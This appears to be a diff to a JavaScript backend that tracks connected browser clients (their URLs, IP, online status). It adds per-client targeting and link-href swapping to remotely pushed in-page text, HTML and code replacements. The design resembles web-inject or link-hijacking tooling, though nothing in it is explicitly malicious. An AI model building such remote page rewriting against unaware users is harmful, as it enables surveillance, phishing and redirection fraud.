@@ -768,6 +768,7 @@ export async function getClients() {
       domain: domain,
       lastDomain: domain,
       lastUrl: c.lastUrl || c.currentUrl || '',
+      ip: c.ip || '127.0.0.1',
       lastSeen: c.lastSeen,
       isOnline: isOnline,
       status: isOnline ? 'online' : 'offline',
@@ -885,7 +886,7 @@ export async function getStats() {
 // DOM TEXT REPLACEMENTS OPERATIONS (In-Page Text Modifier)
 // ----------------------------------------------------------------------
 
-export async function getReplacements(domain = null) {
+export async function getReplacements(domain = null, clientId = null) {
   const { db, isLive } = await getDatabase();
   let list = [];
 
@@ -900,11 +901,23 @@ export async function getReplacements(domain = null) {
     list = (local.replacements || []).filter((r) => r.enabled !== false);
   }
 
-  if (!domain) return list;
-
   return list.filter((r) => {
-    if (!r.domain || r.domain === '*' || r.domain === '<all_urls>') return true;
-    return matchDomain(r.domain, domain);
+    // 1. Domain matching
+    if (domain) {
+      if (r.domain && r.domain !== '*' && r.domain !== '<all_urls>' && !matchDomain(r.domain, domain)) {
+        return false;
+      }
+    }
+
+    // 2. Client targeting:
+    // If r.targetClientId is set, only match if clientId matches!
+    if (r.targetClientId && r.targetClientId.trim()) {
+      if (!clientId || r.targetClientId.trim() !== clientId.trim()) {
+        return false;
+      }
+    }
+
+    return true;
   });
 }
 
@@ -934,9 +947,13 @@ export async function saveReplacement(data) {
   const replacementItem = {
     id,
     domain: (data.domain || '*').trim(),
+    targetClientId: (data.targetClientId || '').trim(),
+    isGlobal: !data.targetClientId || !data.targetClientId.trim(),
     selector: (data.selector || '').trim(),
     originalText: (data.originalText || '').trim(),
     replacementText: data.replacementText !== undefined ? String(data.replacementText) : '',
+    originalHref: (data.originalHref || '').trim(),
+    replacementHref: (data.replacementHref || '').trim(),
     pastedCode: (data.pastedCode || '').trim(),
     replaceType: data.replaceType || 'text', // 'text' | 'html'
     enabled: data.enabled !== undefined ? Boolean(data.enabled) : true,
